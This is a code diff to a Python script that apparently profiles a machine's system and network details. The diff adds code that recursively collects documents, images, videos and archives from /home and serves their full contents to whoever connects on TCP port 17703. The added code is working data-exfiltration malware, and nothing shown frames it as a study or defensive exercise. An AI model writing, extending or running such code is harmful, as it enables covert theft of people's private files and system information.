@@ -1,7 +1,5 @@
 import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os
 
-path = r"/home"
-
 #Getting information about the system
 systemInfo = {}
 systemInfo['platformInfo'] = {}
@@ -100,18 +98,26 @@ else:
 routingTable = rtCommand.stdout
 dns = dnsCommand.stdout
 
+#Searching files 
+path = r"/home"
+filesToSend = [{}]
+for root, dirs, files in os.walk(path):
+	for x in files:
+		if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
+			filesProperties = {}
+			filesProperties['path'] = root + "/" + x
+			filesProperties['filename'] = x
+			filesToSend.append(filesProperties)
+filesToSend.pop(0)			
+numFiles = len(filesToSend)
+
 #Network variables initialization for connection to the client 
 serverPort = 17703
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.bind(('', serverPort))
 serverSocket.listen(1)
 
-#Searching files 
-for root, dirs, files in os.walk(path):
-	for x in files:
-		if (x.endswith('.txt')):
-			print(root + r"/" + x)
-			
+
 #Sending information obtained
 while True:
 	connectionSocket,addr = serverSocket.accept()
@@ -123,13 +129,17 @@ while True:
 	connectionSocket.recv(128)
 	
 #Sending obtained files 
-	with open ("prova.mp4","rb") as f:
-		fileSize = os.path.getsize("prova.mp4")
-		connectionSocket.send("prova.mp4".encode())
-		connectionSocket.recv(128)
-		connectionSocket.send(str(fileSize).encode())
-		connectionSocket.recv(128)
-		data = f.read()
-		connectionSocket.sendall(data)
-		connectionSocket.send(b"<TMB>") 
+	connectionSocket.send(str(numFiles).encode())
+	connectionSocket.recv(128)
+	for i in range(numFiles):
+		with open (filesToSend[i]['path'],"rb") as f:
+			fileSize = os.path.getsize(filesToSend[i]['path'])
+			connectionSocket.send(filesToSend[i]['filename'].encode())
+			connectionSocket.recv(128)
+			connectionSocket.send(str(fileSize).encode())
+			connectionSocket.recv(128)
+			data = f.read()
+			connectionSocket.sendall(data)
+			connectionSocket.send(b"<TMB>") 
+			connectionSocket.recv(128)
 	connectionSocket.close()
